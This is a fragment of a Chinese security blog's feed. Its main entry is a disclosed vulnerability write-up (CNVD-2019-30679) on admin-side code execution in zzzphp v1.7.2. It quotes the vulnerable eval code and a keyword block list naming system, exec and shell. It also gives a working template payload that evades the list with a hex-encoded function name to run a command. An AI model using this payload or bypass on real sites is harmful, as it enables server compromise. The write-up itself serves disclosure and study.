class="line">https://www.ruanyifeng.com/blog/2019/09/cookie-samesite.html</span><br><span class="line">https://tech.meituan.com/2018/10/11/fe-security-csrf.html</span><br><span class="line">https://xz.aliyun.com/t/6539#toc-8</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;此类攻击属于 CSRF（ Cross-site request forgery 跨站请求伪造）攻击范畴。当某网站通过 JSONP 的方式来跨域（一般为子域）传递用户认证后的敏感信息时，攻击者可以构造恶意的 JSONP 调用页面，诱导被攻击者访问来达到截取用户敏感信息的目的。&lt;/p&gt;
    
    </summary>
    
    
      <category term="CSRF" scheme="https://www.sys71m.top/categories/CSRF/"/>
    
    
      <category term="JSON" scheme="https://www.sys71m.top/tags/JSON/"/>
    
      <category term="劫持" scheme="https://www.sys71m.top/tags/%E5%8A%AB%E6%8C%81/"/>
    
  </entry>
  
  <entry>
    <title>zzzphp v1.7.2 后台任意代码执行</title>
    <link href="https://www.sys71m.top/2019/10/22/zzzphp-v1-7-2-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    <id>https://www.sys71m.top/2019/10/22/zzzphp-v1-7-2-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</id>
    <published>2019-10-22T02:43:20.000Z</published>
    <updated>2020-11-04T23:46:36.000Z</updated>
    
    <content type="html"><![CDATA[<p>暑假挖到的一个洞，已提交国家信息安全漏洞共享平台，CNVD-2019-30679</p><a id="more"></a>  <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前段时间在学习代码审计，便想找个cms跟着大佬的姿势学习一下，在对比最新版本的补丁时发现虽然进行了过滤，但依然有方法绕过，故在此记录下。</p><p>漏洞连接：<a href="https://www.cnvd.org.cn/flaw/show/1728311" target="_blank" rel="noopener">https://www.cnvd.org.cn/flaw/show/1728311</a></p><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>后台<code>inc/zzz_template.php</code>模板解析中对字符过滤不严格导致代码执行</p><p>查看<code>zzz_template.php</code>中代码到2355行的<code>parserIfLabel</code>函数，部分代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parserIfLabel</span><span class="params">( $zcontent )</span> </span>&#123;</span><br><span class="line">$pattern = <span class="string">'/\&#123;if:([\s\S]+?)&#125;([\s\S]*?)&#123;end\s+if&#125;/'</span>;</span><br><span class="line"><span class="keyword">if</span> ( preg_match_all( $pattern, $zcontent, $matches ) ) &#123;</span><br><span class="line">$count = count( $matches[ <span class="number">0</span> ] );</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $count; $i++ ) &#123;</span><br><span class="line">$flag = <span class="string">''</span>;</span><br><span class="line">$out_html = <span class="string">''</span>;</span><br><span class="line">$ifstr = $matches[ <span class="number">1</span> ][ $i ];</span><br><span class="line"></span><br><span class="line">$ifstr=danger_key($ifstr);</span><br><span class="line">$ifstr = str_replace( <span class="string">'='</span>, <span class="string">'=='</span>, $ifstr );</span><br><span class="line">$ifstr = str_replace( <span class="string">'&lt;&gt;'</span>, <span class="string">'!='</span>, $ifstr );</span><br><span class="line">$ifstr = str_replace( <span class="string">'or'</span>, <span class="string">'||'</span>, $ifstr );</span><br><span class="line">$ifstr = str_replace( <span class="string">'and'</span>, <span class="string">'&amp;&amp;'</span>, $ifstr );</span><br><span class="line">$ifstr = str_replace( <span class="string">'mod'</span>, <span class="string">'%'</span>, $ifstr );</span><br><span class="line"><span class="comment">//echop( $ifstr);</span></span><br><span class="line">               <span class="keyword">echo</span> $ifstr;</span><br><span class="line">@<span class="keyword">eval</span>( <span class="string">'if('</span> . $ifstr . <span class="string">')&#123;$flag="if";&#125;else&#123;$flag="else";&#125;'</span> );</span><br></pre></td></tr></table></figure><p> 正则匹配到的字符串经过了<code></code>danger_key`处理，代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">danger_key</span><span class="params">( $s , $len=<span class="number">255</span>)</span> </span>&#123;</span><br><span class="line">   $danger=<span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'preg'</span>,<span class="string">'server'</span>,<span class="string">'chr'</span>,<span class="string">'decode'</span>,<span class="string">'html'</span>,<span class="string">'md5'</span>,<span class="string">'post'</span>,<span class="string">'get'</span>,<span class="string">'cookie'</span>,<span class="string">'session'</span>,<span class="string">'sql'</span>,<span class="string">'del'</span>,<span class="string">'encrypt'</span>,<span class="string">'upload'</span>,<span class="string">'db'</span>,<span class="string">'$'</span>,<span class="string">'system'</span>,<span class="string">'exec'</span>,<span class="string">'shell'</span>,<span class="string">'popen'</span>,<span class="string">'eval'</span>);   </span><br><span class="line">    $s = str_ireplace($danger,<span class="string">"*"</span>,$s);</span><br><span class="line"><span class="keyword">return</span> $s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可利用php变量函数绕过此规则</p><h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><p>登录到后台地址，<code>adminxxx</code>，后三位安装时随机生成。</p><p><img src="https://raw.githubusercontent.com/ttonys/gitPic/master/zp.png" alt></p><p>找到 <code>模板管理 =&gt; 本地模板 =&gt; 编辑</code>，修改<code>cn2016/html/search.html</code>文件，任意位置加入如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="keyword">if</span>:assert(<span class="string">"\x73\x79\x73\x74\x65\x6d"</span>(<span class="string">"ipconfig"</span>))&#125;test&#123;end <span class="keyword">if</span>&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ttonys/gitPic/master/zh1.png" alt></p><p>前端访问<code>search</code>页面，代码正常执行。</p><p><img src="https://raw.githubusercontent.com/ttonys/gitPic/master/zhzh.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;暑假挖到的一个洞，已提交国家信息安全漏洞共享平台，CNVD-2019-30679&lt;/p&gt;
    
    </summary>
    
    
      <category term="代码审计" scheme="https://www.sys71m.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="PHP" scheme="https://www.sys71m.top/tags/PHP/"/>
    
      <category term="cms" scheme="https://www.sys71m.top/tags/cms/"/>
    
  </entry>
  
</feed>
